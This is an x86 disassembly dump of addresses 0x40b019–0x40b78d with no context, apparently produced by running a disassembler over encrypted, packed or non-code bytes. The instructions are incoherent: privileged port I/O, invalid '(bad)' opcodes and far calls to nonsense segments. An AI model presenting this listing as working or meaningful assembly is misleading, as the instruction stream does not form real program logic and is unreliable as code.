  40b019:	or     DWORD PTR [edi+0x1e80d795],esp
  40b01f:	aad    0x9b
  40b021:	adc    esp,esp
  40b023:	fild   QWORD PTR [ebx+0x4acee6c4]
  40b029:	xchg   ebx,eax
  40b02a:	in     al,dx
  40b02b:	imul   eax,DWORD PTR [esi+0x3e978e80],0x6c19931b
  40b035:	pop    ebx
  40b036:	pop    ecx
  40b037:	sub    ecx,DWORD PTR [ebx]
  40b039:	add    edx,edx
  40b03b:	mov    ecx,0xe3c8cfd5
  40b040:	out    dx,eax
  40b041:	loop   0x40b029
  40b043:	xchg   ebx,eax
  40b044:	and    edx,edi
  40b046:	mov    ch,0xf8
  40b048:	xchg   ebp,eax
  40b049:	adc    al,0x44
  40b04b:	js     0x40aff9
  40b04d:	and    eax,0x2e532468
  40b052:	and    eax,0xfc54e3d7
  40b057:	and    eax,0x808a6194
  40b05c:	daa    
  40b05d:	call   0x330b:0xb3812581
  40b064:	dec    ebp
  40b065:	mov    dl,0x77
  40b067:	jl     0x40b08d
  40b069:	sub    eax,0x3622bb7b
  40b06e:	adc    DWORD PTR [eax],eax
  40b070:	hlt    
  40b071:	scas   al,BYTE PTR es:[edi]
  40b072:	das    
  40b073:	sub    BYTE PTR [edi-0x6c125a87],cl
  40b079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b07a:	jo     0x40b0ae
  40b07c:	aam    0x94
  40b07e:	xchg   ebp,eax
  40b07f:	fisttp DWORD PTR [esi+0x1e]
  40b082:	jbe    0x40b07c
  40b084:	inc    esp
  40b085:	push   ds
  40b086:	jecxz  0x40b027
  40b088:	fs jecxz 0x40b049
  40b08b:	mov    dl,0x91
  40b08d:	not    DWORD PTR [ebp+0x209c13c7]
  40b093:	stos   DWORD PTR es:[edi],eax
  40b094:	pop    ds
  40b095:	mov    ah,0xa3
  40b097:	outs   dx,BYTE PTR ds:[esi]
  40b098:	loope  0x40b02f
  40b09a:	cmc    
  40b09b:	call   0x680b6f47
  40b0a0:	add    eax,0x2dbf4ea3
  40b0a5:	jbe    0x40b0bc
  40b0a7:	mov    cl,0x58
  40b0a9:	mov    ah,0x9
  40b0ab:	ud2    
  40b0ad:	shr    BYTE PTR ds:0xf4e658d,0x22
  40b0b4:	sub    bh,0xad
  40b0b7:	pop    esi
  40b0b8:	pop    ecx
  40b0b9:	out    0x46,eax
  40b0bb:	pop    ebp
  40b0bc:	retf   
  40b0bd:	je     0x40b10f
  40b0bf:	jae    0x40b094
  40b0c1:	sbb    edx,ebp
  40b0c3:	ins    DWORD PTR es:[edi],dx
  40b0c4:	lds    edx,FWORD PTR [esi+edi*2-0x65c1c4ba]
  40b0cb:	hlt    
  40b0cc:	pushf  
  40b0cd:	daa    
  40b0ce:	popf   
  40b0cf:	lds    ebp,FWORD PTR [edx]
  40b0d1:	inc    eax
  40b0d2:	(bad)  
  40b0d3:	cmp    al,bh
  40b0d5:	dec    edi
  40b0d6:	fs scas eax,DWORD PTR es:[edi]
  40b0d8:	iret   
  40b0d9:	sub    BYTE PTR [ebx+0x28],ch
  40b0dc:	push   es
  40b0dd:	data16 js 0x40b098
  40b0e0:	ins    BYTE PTR es:[edi],dx
  40b0e1:	jb     0x40b0ea
  40b0e3:	xor    eax,0xd5e9777e
  40b0e8:	jle    0x40b0fc
  40b0ea:	gs das 
  40b0ec:	xchg   esp,eax
  40b0ed:	add    DWORD PTR [edx-0x69],ebp
  40b0f0:	jg     0x40b08e
  40b0f2:	mov    ebp,0xcbe7e707
  40b0f7:	das    
  40b0f8:	jne    0x40b0bc
  40b0fa:	dec    edi
  40b0fb:	nop
  40b0fc:	in     al,0x60
  40b0fe:	test   DWORD PTR [ecx+0x6355aa47],esp
  40b104:	es sti 
  40b106:	stos   BYTE PTR es:[edi],al
  40b107:	sahf   
  40b108:	mov    esp,0xff7cef4e
  40b10d:	aad    0x3f
  40b10f:	fmul   QWORD PTR [edi+0x4963af46]
  40b115:	test   DWORD PTR [edx+ebp*2],esp
  40b118:	div    DWORD PTR [ecx+esi*1+0x9335c77]
  40b11f:	aam    0x96
  40b121:	mov    eax,ds:0x4b99eb22
  40b126:	xchg   DWORD PTR [edi+0x56a37ea0],ebx
  40b12c:	push   ebp
  40b12d:	out    0x70,eax
  40b12f:	push   0x12aea06d
  40b134:	(bad)
  40b138:	push   ecx
  40b139:	mov    esp,0x31f0f0d7
  40b13e:	xor    esp,ecx
  40b140:	push   eax
  40b141:	or     BYTE PTR [edx+0x66],0x3b
  40b145:	and    BYTE PTR [ebx+0x34],dh
  40b148:	test   dl,cl
  40b14a:	adc    DWORD PTR [edi],0x69e30ff3
  40b150:	and    cl,BYTE PTR [ebx-0x10]
  40b153:	add    BYTE PTR [edi+0x2559c9c1],dh
  40b159:	in     eax,dx
  40b15a:	push   ss
  40b15b:	or     al,0xb4
  40b15d:	xor    ah,bl
  40b15f:	cmp    eax,0x7cd0218f
  40b164:	push   esp
  40b165:	call   0x14165cf5
  40b16a:	dec    ecx
  40b16b:	mov    BYTE PTR [edi+ebx*2],ah
  40b16e:	or     DWORD PTR [edx],ecx
  40b170:	inc    ebp
  40b171:	leave  
  40b172:	mov    ds:0x9da1f27b,al
  40b177:	or     eax,0xd8b33462
  40b17c:	cwde   
  40b17d:	push   esi
  40b17e:	push   es
  40b17f:	das    
  40b180:	nop    DWORD PTR [eax]
  40b183:	in     eax,dx
  40b184:	retf   0xd9b5
  40b187:	mov    bh,bh
  40b189:	or     BYTE PTR [ecx+0x58],cl
  40b18c:	pop    ebp
  40b18d:	sbb    esi,DWORD PTR [edi+0x73]
  40b190:	lock dec ebp
  40b192:	idiv   DWORD PTR [ebp+0x7b]
  40b195:	jno    0x40b16d
  40b197:	das    
  40b198:	retf   0xd3f3
  40b19b:	cwde   
  40b19c:	leave  
  40b19d:	jp     0x40b1ef
  40b19f:	push   0xbf50710d
  40b1a4:	test   al,0x67
  40b1a6:	stc    
  40b1a7:	test   DWORD PTR [ebx+eax*1+0x1f],edi
  40b1ab:	cmp    eax,0xd7834c64
  40b1b0:	or     eax,0x66b5e715
  40b1b5:	xchg   ebp,eax
  40b1b6:	mov    cl,0x99
  40b1b8:	mov    ds:0x97604975,eax
  40b1bd:	mov    cl,0x4
  40b1bf:	ret    0x1d89
  40b1c2:	push   ebx
  40b1c3:	not    DWORD PTR [esi+0x42]
  40b1c6:	mov    dl,0x87
  40b1c8:	nop
  40b1c9:	mov    cl,0x5f
  40b1cb:	add    al,0x70
  40b1cd:	mov    ah,0xbd
  40b1cf:	mov    WORD PTR [ebp+ecx*1+0x1b],es
  40b1d3:	(bad)  
  40b1d4:	mov    bh,0xe3
  40b1d6:	add    eax,0xca90a161
  40b1db:	add    esi,esi
  40b1dd:	arpl   WORD PTR [ebx-0x60],bx
  40b1e0:	inc    esi
  40b1e1:	jns    0x40b175
  40b1e3:	add    al,0x33
  40b1e5:	adc    esi,DWORD PTR [esi-0x3c]
  40b1e8:	into   
  40b1e9:	mov    ecx,0x921080e3
  40b1ee:	imul   eax,DWORD PTR [edx+0x2d],0x24546939
  40b1f5:	mov    ah,0x8f
  40b1f7:	lods   al,BYTE PTR ds:[esi]
  40b1f8:	test   ecx,edi
  40b1fa:	ss cwde 
  40b1fc:	push   ds
  40b1fd:	mov    BYTE PTR [edi],ch
  40b1ff:	test   DWORD PTR [eax],ebp
  40b201:	loopne 0x40b1b5
  40b203:	nop
  40b204:	and    al,0xb0
  40b206:	mov    dl,0x34
  40b208:	sbb    BYTE PTR [edx-0x4ed55403],ah
  40b20e:	or     DWORD PTR [ebx-0x70],esi
  40b211:	jle    0x40b232
  40b213:	mov    esp,DWORD PTR [edx+0x2e]
  40b216:	test   eax,0xb9380749
  40b21b:	adc    ebp,ecx
  40b21d:	sahf   
  40b21e:	ins    BYTE PTR es:[edi],dx
  40b21f:	xchg   esi,eax
  40b220:	fcmovbe st,st(5)
  40b222:	retf   
  40b223:	pop    ecx
  40b224:	ficomp DWORD PTR [ebp-0x24db9aeb]
  40b22a:	dec    BYTE PTR [ebp+0x21f90555]
  40b230:	mov    ch,0x5b
  40b232:	lods   al,BYTE PTR ds:[esi]
  40b233:	ret    
  40b234:	cdq    
  40b235:	add    al,0x6a
  40b237:	lods   eax,DWORD PTR ds:[esi]
  40b238:	push   esi
  40b239:	xor    BYTE PTR [ebx-0x20],bh
  40b23c:	out    0x36,al
  40b23e:	and    eax,0x5bd856f
  40b243:	hlt    
  40b244:	mov    bl,0x8d
  40b246:	call   0xf5e50b26
  40b24b:	and    al,0xc3
  40b24d:	arpl   WORD PTR [ebp+0x77eb8308],dx
  40b253:	lds    esi,FWORD PTR [esi+eiz*1+0x78]
  40b257:	jns    0x40b2ce
  40b259:	push   ebp
  40b25a:	cmp    DWORD PTR [edx],edi
  40b25c:	push   ss
  40b25d:	push   0xe6c2b272
  40b262:	fiadd  DWORD PTR [edi-0x68242f2c]
  40b268:	loope  0x40b2aa
  40b26a:	(bad)  
  40b26b:	rcl    BYTE PTR [ecx-0x1f136b75],1
  40b271:	out    dx,eax
  40b272:	sbb    al,0x76
  40b274:	sbb    DWORD PTR [edi+0x76],esi
  40b277:	xchg   esi,esi
  40b279:	test   BYTE PTR [edx+0x16],cl
  40b27c:	lods   eax,DWORD PTR ds:[esi]
  40b27d:	fsub   QWORD PTR [edx]
  40b27f:	imul   BYTE PTR [ecx]
  40b281:	or     cl,BYTE PTR [ebx]
  40b283:	sbb    BYTE PTR [esi+0x68],bl
  40b286:	call   0xe377ea98
  40b28b:	out    dx,eax
  40b28c:	jle    0x40b302
  40b28e:	add    al,ch
  40b290:	lds    edi,FWORD PTR [edx]
  40b292:	and    al,0xa
  40b294:	stc    
  40b295:	sbb    al,0x7a
  40b297:	iret   
  40b298:	push   edx
  40b299:	scas   eax,DWORD PTR es:[edi]
  40b29a:	cli    
  40b29b:	out    0x76,eax
  40b29d:	add    BYTE PTR [ecx+0x3a],0x1c
  40b2a1:	xor    ecx,DWORD PTR [edx-0x3ebeb987]
  40b2a7:	dec    eax
  40b2a8:	(bad)  
  40b2a9:	jmp    0x40b2bf
  40b2ab:	and    al,BYTE PTR [edx]
  40b2ad:	ins    BYTE PTR es:[edi],dx
  40b2ae:	stos   DWORD PTR es:[edi],eax
  40b2af:	adc    DWORD PTR [eax+0x66],esi
  40b2b2:	cwde   
  40b2b3:	jns    0x40b270
  40b2b5:	dec    ebp
  40b2b6:	lods   eax,DWORD PTR ds:[esi]
  40b2b7:	(bad)
  40b2ba:	inc    DWORD PTR [esi]
  40b2bc:	sub    BYTE PTR [eax-0x43],al
  40b2bf:	fbld   TBYTE PTR [edi-0x6bfd702b]
  40b2c5:	stos   DWORD PTR es:[edi],eax
  40b2c6:	aas    
  40b2c7:	pop    esp
  40b2c8:	sub    eax,0x7a0adab1
  40b2cd:	cli    
  40b2ce:	adc    DWORD PTR [ecx-0x68],eax
  40b2d1:	inc    edx
  40b2d2:	(bad)  
  40b2d3:	leave  
  40b2d4:	jb     0x40b2b6
  40b2d6:	retf   
  40b2d7:	(bad)  
  40b2d8:	stos   BYTE PTR es:[edi],al
  40b2d9:	mov    edi,0xc0cf3e68
  40b2de:	mov    esp,0x68e50c58
  40b2e3:	rol    edx,0xb0
  40b2e6:	jge    0x40b293
  40b2e8:	bound  eax,QWORD PTR [edx+edi*2-0x70cb6a56]
  40b2ef:	hlt    
  40b2f0:	outs   dx,BYTE PTR ds:[esi]
  40b2f1:	sahf   
  40b2f2:	not    BYTE PTR [edx]
  40b2f4:	test   al,0x53
  40b2f6:	scas   al,BYTE PTR es:[edi]
  40b2f7:	mov    bl,0x5e
  40b2f9:	xor    eax,DWORD PTR [eax+0x11]
  40b2fc:	or     BYTE PTR [ebp+0x9],bh
  40b2ff:	call   0x1e30:0xf6119771
  40b306:	xchg   edx,eax
  40b307:	pop    ds
  40b308:	pop    ebp
  40b309:	pop    ds
  40b30a:	enter  0x47b0,0xc4
  40b30e:	scas   eax,DWORD PTR es:[edi]
  40b30f:	test   ebp,edi
  40b311:	jge    0x40b315
  40b313:	dec    esp
  40b314:	mov    dl,0xd6
  40b316:	mov    eax,ds:0x97735239
  40b31b:	jp     0x40b2ed
  40b31d:	mov    dh,0x35
  40b31f:	or     DWORD PTR [ecx-0x60],esp
  40b322:	test   cl,dh
  40b324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b325:	xchg   ebx,eax
  40b326:	and    al,0x6f
  40b328:	(bad)  
  40b329:	test   al,0xf4
  40b32b:	add    BYTE PTR [esi-0x29aad7a0],bh
  40b331:	mov    esp,0x9dc96877
  40b336:	stc    
  40b337:	retf   
  40b338:	inc    esi
  40b339:	inc    eax
  40b33a:	jbe    0x40b302
  40b33c:	mov    fs,WORD PTR [ebx]
  40b33e:	test   eax,0x6ab19fa9
  40b343:	test   BYTE PTR [edi-0x28375c65],dh
  40b349:	and    esi,DWORD PTR [esp+ebx*4-0x842dec5]
  40b350:	dec    dx
  40b352:	dec    ebp
  40b353:	pushf  
  40b354:	aas    
  40b355:	std    
  40b356:	xchg   DWORD PTR [esi],ebp
  40b358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b359:	int3   
  40b35a:	jle    0x40b2e2
  40b35c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b35d:	clc    
  40b35e:	mov    eax,ds:0x49f2214f
  40b363:	pop    eax
  40b364:	cmp    DWORD PTR [ecx-0x7a],ecx
  40b367:	add    dh,BYTE PTR [ecx+0x62]
  40b36a:	jg     0x40b353
  40b36c:	dec    edi
  40b36d:	fsubr  QWORD PTR [ecx+ebx*1-0x36b63630]
  40b374:	and    al,0xe5
  40b376:	cmp    eax,0x9119db80
  40b37b:	xchg   ecx,eax
  40b37c:	sub    eax,0xa715be7c
  40b381:	pushaw 
  40b383:	das    
  40b384:	jno    0x40b3d4
  40b386:	les    ebx,FWORD PTR [ecx+0x6e]
  40b389:	sub    eax,0xc076d9d0
  40b38e:	mov    bh,0x5
  40b390:	sub    al,0xda
  40b392:	rcr    DWORD PTR [eax+0x45],cl
  40b395:	iret   
  40b396:	dec    edi
  40b397:	mov    esi,0x201fffa8
  40b39c:	fnstenv [edi]
  40b39e:	or     eax,0x9226c0a8
  40b3a3:	mov    esi,0x35583c6e
  40b3a8:	ins    BYTE PTR es:[edi],dx
  40b3a9:	pop    ebx
  40b3aa:	retf   
  40b3ab:	loopne 0x40b3f1
  40b3ad:	cmc    
  40b3ae:	xlat   BYTE PTR ds:[ebx]
  40b3af:	es (bad) 
  40b3b2:	jmp    0x8244:0xd538d758
  40b3b9:	or     edx,esi
  40b3bb:	add    ah,BYTE PTR [eax]
  40b3bd:	dec    edi
  40b3be:	cld    
  40b3bf:	xchg   ecx,eax
  40b3c0:	adc    DWORD PTR [eax+eax*1-0x25],ebx
  40b3c4:	sahf   
  40b3c5:	hlt    
  40b3c6:	or     bh,BYTE PTR [edi+0x6f]
  40b3c9:	iret   
  40b3ca:	or     DWORD PTR [edi+0x5f076610],0x28
  40b3d1:	repnz scas al,BYTE PTR es:[edi]
  40b3d3:	add    ebp,edx
  40b3d5:	in     eax,dx
  40b3d6:	lods   al,BYTE PTR ds:[esi]
  40b3d7:	iret   
  40b3d8:	mov    cl,0x33
  40b3da:	jg     0x40b38d
  40b3dc:	retf   
  40b3dd:	add    esi,DWORD PTR [ebx-0x3f]
  40b3e0:	leave  
  40b3e1:	push   ecx
  40b3e2:	call   0x1d61a227
  40b3e7:	das    
  40b3e8:	mov    ah,0x61
  40b3ea:	adc    eax,0xc1b9c480
  40b3ef:	out    0xe,eax
  40b3f1:	je     0x40b44f
  40b3f3:	test   DWORD PTR [ecx-0xe],edx
  40b3f6:	xor    eax,0x25be0e19
  40b3fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3fc:	fwait
  40b3fd:	arpl   WORD PTR [ecx+0x3960fae7],ax
  40b403:	fld    TBYTE PTR [ebx]
  40b405:	jnp    0x40b445
  40b407:	popa   
  40b408:	jne    0x40b3d6
  40b40a:	loop   0x40b3c0
  40b40c:	aaa    
  40b40d:	or     esi,DWORD PTR [ecx+ecx*4-0x2bb0fb72]
  40b414:	jmp    0x7875754e
  40b419:	arpl   WORD PTR [edx+0x24],bp
  40b41c:	jns    0xd5d7a4d9
  40b422:	aas    
  40b423:	ss mov ecx,0x63f195c6
  40b429:	push   esi
  40b42a:	into   
  40b42b:	push   edi
  40b42c:	data16 neg BYTE PTR [ecx+0x51]
  40b430:	es out 0x78,eax
  40b433:	sub    eax,0x9226a033
  40b438:	mov    edx,0xff7c84c6
  40b43d:	adc    al,0x2d
  40b43f:	mov    esp,0xcad9f099
  40b444:	sbb    bl,BYTE PTR [eax-0x43a705a9]
  40b44a:	sbb    eax,0xeb8a109
  40b44f:	mov    ecx,0x6037edc3
  40b454:	inc    esp
  40b455:	repnz (bad) 
  40b457:	(bad)  
  40b458:	pop    esp
  40b459:	fisttp WORD PTR [ecx+esi*8]
  40b45c:	and    al,0xae
  40b45e:	(bad)  
  40b45f:	push   0xb87ce4bd
  40b464:	pushf  
  40b465:	xor    al,0x6d
  40b467:	pop    es
  40b468:	cmp    esi,ebx
  40b46a:	sbb    eax,edi
  40b46c:	adc    al,0x8e
  40b46e:	or     eax,0x9417304
  40b473:	xchg   edi,eax
  40b474:	sub    eax,0x280d767a
  40b479:	jbe    0x40b4e3
  40b47b:	fdivr  QWORD PTR [ebp-0xe1dfe9a]
  40b481:	lds    esi,FWORD PTR [eax]
  40b483:	cli    
  40b484:	fidiv  DWORD PTR [ecx-0x7d]
  40b487:	mov    ds:0xce67469e,eax
  40b48c:	jecxz  0x40b4e6
  40b48e:	push   edi
  40b48f:	sub    ch,dh
  40b491:	loop   0x40b494
  40b493:	sbb    al,0x13
  40b495:	adc    al,0x20
  40b497:	fistp  QWORD PTR [ecx]
  40b499:	lock jns 0x40b4f1
  40b49c:	xchg   esp,eax
  40b49d:	mov    al,ds:0x9a3df652
  40b4a2:	loop   0x40b46c
  40b4a4:	mov    ch,0x19
  40b4a6:	add    BYTE PTR [ecx],ah
  40b4a8:	inc    ebp
  40b4a9:	jae    0x40b45f
  40b4ab:	call   0x1d09:0x5830c07b
  40b4b2:	test   BYTE PTR [esi+ebp*1-0x20],cl
  40b4b6:	out    dx,al
  40b4b7:	xchg   ebp,eax
  40b4b8:	(bad)  
  40b4b9:	mov    dh,0x11
  40b4bb:	add    ah,BYTE PTR [esi+0x1f8e4ffe]
  40b4c1:	jb     0x40b501
  40b4c3:	jg     0x40b480
  40b4c5:	xchg   edx,eax
  40b4c6:	lea    eax,[ebp+0x66e71cde]
  40b4cc:	(bad)  
  40b4cd:	xchg   edx,eax
  40b4ce:	jbe    0x40b4cc
  40b4d0:	inc    esi
  40b4d1:	sti    
  40b4d2:	imul   edi,DWORD PTR [edi],0xb53898c3
  40b4d8:	in     al,0x67
  40b4da:	mov    ebx,DWORD PTR [eax+ebp*8]
  40b4dd:	adc    eax,0xb5d8caa8
  40b4e2:	jb     0x40b4ee
  40b4e4:	mov    ebx,0x900e032c
  40b4e9:	lods   al,BYTE PTR ds:[esi]
  40b4ea:	and    dl,ah
  40b4ec:	retf   0xbbb5
  40b4ef:	xor    al,0xbd
  40b4f1:	xchg   esi,eax
  40b4f2:	stc    
  40b4f3:	fs es push ecx
  40b4f6:	jns    0x40b52d
  40b4f8:	adc    eax,0xf7ca8ac3
  40b4fd:	cmova  edi,DWORD PTR [edx]
  40b500:	(bad)  
  40b501:	and    esi,ebx
  40b503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b504:	push   eax
  40b505:	adc    DWORD PTR [ebx+0x1aadd73b],ecx
  40b50b:	mov    ah,0x73
  40b50d:	loopne 0x40b4ef
  40b50f:	je     0x40b52b
  40b511:	and    al,BYTE PTR [edi+0x57]
  40b514:	sbb    eax,0xf4b0d665
  40b519:	mov    BYTE PTR [ebx*1+0x1b83e5e7],ah
  40b520:	xchg   edx,eax
  40b521:	out    dx,eax
  40b522:	dec    esi
  40b523:	push   0xffffff88
  40b525:	jne    0x40b54a
  40b527:	int3   
  40b528:	mov    al,0x35
  40b52a:	push   cs
  40b52b:	mov    ebp,0xa889278d
  40b530:	xchg   ebp,eax
  40b531:	mov    bh,0x69
  40b533:	sub    al,0xc1
  40b535:	xor    bl,BYTE PTR [eax+0x25acdafc]
  40b53b:	pop    ecx
  40b53c:	loop   0x40b533
  40b53e:	add    al,0x5f
  40b540:	pushf  
  40b541:	inc    ebp
  40b542:	fisttp WORD PTR [eax-0x5b]
  40b545:	enter  0x63e6,0x78
  40b549:	fsub   st,st(7)
  40b54b:	sbb    BYTE PTR [edi+0x50611878],dh
  40b551:	jge    0x40b5b9
  40b553:	xchg   ebp,eax
  40b554:	cli    
  40b555:	mov    esp,DWORD PTR [ecx+0xe0dc083]
  40b55b:	mov    ds:0xe2481112,eax
  40b560:	cwde   
  40b561:	sbb    eax,0x3636b7df
  40b566:	ins    BYTE PTR es:[edi],dx
  40b567:	cmp    eax,0xdb904d95
  40b56c:	mov    cl,0xd1
  40b56e:	clc    
  40b56f:	in     al,dx
  40b570:	or     eax,0x5ea07c53
  40b575:	hlt    
  40b576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b577:	cdq    
  40b578:	or     al,0x14
  40b57a:	mov    BYTE PTR ds:0xecbfe782,0xa5
  40b581:	jb     0x40b5d9
  40b583:	adc    BYTE PTR [ebx],al
  40b585:	cli    
  40b586:	lea    edx,[esi-0x50]
  40b589:	ficom  DWORD PTR [ecx+ecx*4+0xd]
  40b58d:	fdivr  DWORD PTR [ebx+0x3b]
  40b590:	idiv   DWORD PTR [ecx+0x63]
  40b593:	or     dh,ch
  40b595:	or     eax,0xf33e10fc
  40b59a:	dec    ebx
  40b59b:	pop    esp
  40b59c:	in     eax,0xff
  40b59e:	jmp    0x40b5ff
  40b5a0:	sub    al,0xb8
  40b5a2:	xor    DWORD PTR [eax],edx
  40b5a4:	or     BYTE PTR [esi-0x2251a646],al
  40b5aa:	loope  0x40b62a
  40b5ac:	inc    ebx
  40b5ad:	or     ah,bl
  40b5af:	pop    es
  40b5b0:	popa   
  40b5b1:	loop   0x40b575
  40b5b3:	stos   BYTE PTR es:[edi],al
  40b5b4:	fdivrp st(6),st
  40b5b6:	shl    DWORD PTR [ebp+edi*4+0x30462bd7],1
  40b5bd:	inc    BYTE PTR [esi-0x5de9c31b]
  40b5c3:	out    dx,al
  40b5c4:	add    al,ah
  40b5c6:	inc    esi
  40b5c7:	les    ecx,FWORD PTR [edi+eax*1-0x1d]
  40b5cb:	in     eax,0x22
  40b5cd:	outs   dx,DWORD PTR ds:[esi]
  40b5ce:	icebp  
  40b5cf:	aam    0x17
  40b5d1:	(bad)  
  40b5d2:	pop    edx
  40b5d3:	xor    eax,0x3fcff029
  40b5d8:	jl     0x40b60c
  40b5da:	aas    
  40b5db:	mov    dh,0x62
  40b5dd:	or     ch,BYTE PTR [ecx+0x65b5e82c]
  40b5e3:	sub    BYTE PTR [esi+edi*4],cl
  40b5e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5e7:	jmp    0xdaf62fa3
  40b5ec:	adc    eax,0xc59b76a3
  40b5f1:	lods   eax,DWORD PTR ds:[esi]
  40b5f2:	ds (bad) 
  40b5f4:	in     al,dx
  40b5f5:	cmp    ah,bh
  40b5f7:	pop    edi
  40b5f8:	loopne 0x40b607
  40b5fa:	dec    esi
  40b5fb:	adc    eax,0x7d96fcce
  40b600:	sbb    eax,0x861be42
  40b605:	jge    0x40b66a
  40b607:	push   edi
  40b608:	adc    BYTE PTR [edx],0xe8
  40b60b:	sbb    dh,BYTE PTR [edi]
  40b60d:	jae    0x40b5af
  40b60f:	push   0x23
  40b611:	sbb    eax,DWORD PTR [edi-0x702e00f6]
  40b617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b618:	cmp    bl,bl
  40b61a:	xchg   DWORD PTR [eax],eax
  40b61c:	xor    eax,0x52d99677
  40b621:	mov    ebp,0x1b2df922
  40b626:	retf   0x485
  40b629:	out    0x61,eax
  40b62b:	push   ebx
  40b62c:	cmp    BYTE PTR [esi+0x4018494f],ah
  40b632:	pop    eax
  40b633:	pop    edx
  40b634:	inc    edx
  40b635:	dec    edx
  40b636:	mov    ebp,DWORD PTR [eax+esi*1+0x7f636f05]
  40b63d:	or     DWORD PTR [di-0x9],eax
  40b641:	into   
  40b642:	or     al,0x5
  40b644:	adc    DWORD PTR [esi+edi*4-0x68c59446],edi
  40b64b:	jno    0x40b5ee
  40b64d:	adc    al,0xbb
  40b64f:	and    al,0x27
  40b651:	shl    DWORD PTR [esi+0x30bb21ac],1
  40b657:	add    al,0x81
  40b65a:	aas    
  40b65b:	mov    bl,0x98
  40b65d:	fwait
  40b65e:	cmp    DWORD PTR [edi+ebp*1+0x12],eax
  40b662:	shl    edx,1
  40b664:	(bad)  
  40b665:	ficom  WORD PTR [esi+ecx*2-0x1d]
  40b669:	iretw  
  40b66b:	sbb    bh,cl
  40b66d:	call   FWORD PTR [ebx]
  40b66f:	mov    eax,0xf67c03e0
  40b674:	ins    BYTE PTR es:[edi],dx
  40b675:	xor    al,0xd
  40b677:	xchg   ecx,eax
  40b678:	in     al,dx
  40b679:	out    dx,al
  40b67a:	addr16 sbb esp,ebx
  40b67d:	inc    ebx
  40b67e:	sbb    eax,0x2f0d83cb
  40b683:	fdiv   DWORD PTR ds:0xea1ba63
  40b689:	dec    edi
  40b68a:	(bad)  
  40b68b:	lahf   
  40b68c:	fcom   DWORD PTR [edx-0x7abc5741]
  40b692:	pop    ebp
  40b693:	int    0xef
  40b695:	and    dh,ch
  40b697:	dec    eax
  40b698:	push   eax
  40b699:	pop    ebp
  40b69a:	jae    0x40b6f0
  40b69c:	stc    
  40b69d:	je     0x40b707
  40b69f:	xchg   ebp,eax
  40b6a0:	jle    0x40b721
  40b6a2:	push   es
  40b6a3:	pop    ebp
  40b6a4:	ss fisttp QWORD PTR gs:[edx]
  40b6a8:	sub    bl,BYTE PTR [ebx-0x7a]
  40b6ab:	jp     0x40b6de
  40b6ad:	sub    eax,0x203aabe1
  40b6b2:	add    eax,0x1e809d1a
  40b6b7:	pop    ebx
  40b6b8:	fiadd  WORD PTR es:[edx]
  40b6bb:	push   cs
  40b6bc:	inc    edi
  40b6bd:	and    esi,DWORD PTR [ebx-0x7e68f452]
  40b6c3:	loope  0x40b703
  40b6c5:	dec    ebp
  40b6c6:	or     ebx,DWORD PTR [ebx+0x41b9a303]
  40b6cc:	popf   
  40b6cd:	aam    0xa2
  40b6cf:	and    BYTE PTR [ebp+0x328f0aa],dh
  40b6d5:	mov    bh,0xbf
  40b6d7:	fcomp  QWORD PTR [esi+0xa22d182]
  40b6dd:	xchg   ebx,eax
  40b6de:	iret   
  40b6df:	xchg   bx,ax
  40b6e1:	push   ds
  40b6e2:	loop   0x40b6e7
  40b6e4:	dec    esi
  40b6e5:	fst    QWORD PTR [esi]
  40b6e7:	int3   
  40b6e8:	fcom   QWORD PTR [edx+0x13]
  40b6eb:	inc    ecx
  40b6ec:	xchg   esi,eax
  40b6ed:	aas    
  40b6ee:	and    eax,0x3027ce90
  40b6f3:	sbb    BYTE PTR [edi+0x18426c83],ah
  40b6f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6fa:	stos   BYTE PTR es:[edi],al
  40b6fb:	adc    DWORD PTR [edx+0x19],ebx
  40b6fe:	lods   al,BYTE PTR ds:[esi]
  40b6ff:	push   cs
  40b700:	iret   
  40b701:	js     0x40b726
  40b703:	or     esp,0x6b54d478
  40b709:	jbe    0x40b6ea
  40b70b:	add    al,0x4c
  40b70d:	bound  eax,QWORD PTR [eax]
  40b70f:	imul   esi,DWORD PTR [edi+0x75d332b],0x8c6032a1
  40b719:	mov    esi,0x85c34482
  40b71e:	inc    ecx
  40b71f:	dec    edi
  40b720:	dec    esi
  40b721:	aas    
  40b722:	jno    0x40b6e7
  40b724:	mov    cl,0x35
  40b726:	dec    edi
  40b727:	cmp    DWORD PTR [ebp+0x3e4833db],edi
  40b72d:	sbb    eax,0x967309ce
  40b732:	add    esp,edi
  40b734:	cmc    
  40b735:	pop    esp
  40b736:	inc    esp
  40b737:	jae    0x40b7a5
  40b739:	mov    al,0xde
  40b73b:	mov    DWORD PTR [ebx-0x1632a5d3],eax
  40b741:	pop    ds
  40b742:	push   esi
  40b743:	scas   eax,DWORD PTR es:[edi]
  40b744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b745:	jno    0x40b717
  40b747:	inc    esi
  40b748:	pop    edi
  40b749:	dec    ebx
  40b74a:	dec    ecx
  40b74b:	adc    ch,BYTE PTR [ecx-0x47af5578]
  40b751:	rol    DWORD PTR [ebp+0x2f],1
  40b754:	xchg   ebp,eax
  40b755:	pop    ebp
  40b756:	rcr    DWORD PTR [edi-0x63],1
  40b759:	dec    esp
  40b75a:	xchg   ebx,eax
  40b75b:	ja     0x40b702
  40b75d:	xchg   ebx,eax
  40b75e:	adc    bh,bl
  40b760:	out    dx,al
  40b761:	inc    esi
  40b762:	xchg   edx,eax
  40b763:	loop   0x40b6fa
  40b765:	add    eax,0x767ea64d
  40b76a:	mov    ecx,0x3c9d649a
  40b76f:	hlt    
  40b770:	sub    BYTE PTR [ecx+0x4c34aa22],0xb7
  40b777:	push   esp
  40b778:	in     eax,0x1f
  40b77a:	xchg   ebx,eax
  40b77b:	mov    esp,DWORD PTR [ecx-0x6c]
  40b77e:	call   0x5ee1:0x42af3de
  40b785:	mov    dh,0x6f
  40b787:	xor    eax,0xe5457d2b
  40b78c:	int3   
  40b78d:	sbb    ah,ah
